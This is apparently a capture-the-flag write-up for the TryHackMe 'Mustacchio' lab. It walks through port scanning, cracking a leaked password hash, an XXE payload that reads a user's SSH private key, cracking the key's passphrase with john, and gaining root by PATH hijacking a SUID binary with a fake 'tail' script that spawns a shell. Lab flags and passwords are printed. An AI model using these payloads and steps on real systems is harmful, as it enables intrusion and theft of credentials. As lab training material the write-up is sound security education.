> Mustacchio | boot2root

# Nmap
 
nmap -sC -sV -T4 -Pn -vv -p- -oN nmap/initial 10.10.108.197

```bash
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
8765/tcp open  http    syn-ack nginx 1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
```

# Dirsearch

dirsearch -u http://10.10.108.197 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

```bash
301 -  315B  - /images  ->  http://10.10.108.197/images/
301 -  315B  - /custom  ->  http://10.10.108.197/custom/
301 -  314B  - /fonts  ->  http://10.10.108.197/fonts/
```

In /custom folder, in /js sub dir, we can find `users.bak`.

```
��Y�tableusersusersCREATE TABLE users(username text NOT NULL, password t��0]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

Looks like a hash for user `admin`. And we can decode in online using Crackstation. `bulldog19`

But we can't ssh using that username! Finally we move to port 8765. Here our creds. are accepted! Inspecting the page-source we can find that we have a comment line.

```
<!-- Barry, you can now SSH in using your key!-->
```

We can see in that code that we are expected XML input and looking at PayloadAllTheThings we can find XXE basic payload. Let's modify it!

```xml
<?xml version="1.0"?>
<!DOCTYPE author [<!ENTITY read SYSTEM 'file:///home/barry/.ssh/id_rsa'>]>
<root><author>&read;</author></root>
```

And wow!! We have our output! Let's save it, gove corresponding permission and ssh. The SSH private key is password protected! Let's crack it using john.

python ssh2john.py ~/TryHackMe/Mustacchio/id_rsa > ~/TryHackMe/Mustacchio/hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

```
urieljames
```

# user.txt

```
62d77a4d5f97d47c5aa38b3b2651b831
```

Looking for SUID bits we can find something interesting!

find / -perm -u=s -type f 2>/dev/null

```bash
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/gpasswd
/home/joe/live_log => This one!
/bin/ping
/bin/ping6
/bin/umount
/bin/mount
/bin/fusermount
/bin/su
```

Looks like an elf file and on running it we can see that it is Nginx's log. Now we can use strings to see readable characters. We got some interesting things.

```
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
demo.c
crtstuff.c
```

So we have tail command here! Let's change the path and create our own find executable.

# tail

```python
#!/usr/bin/python3
import pty
pty.spawn("/bin/bash")
```

Change the permissions and execute the ELF file. We are in as root!

# root.txt

```
3223581420d906c4dd1a5f9b530393a5
```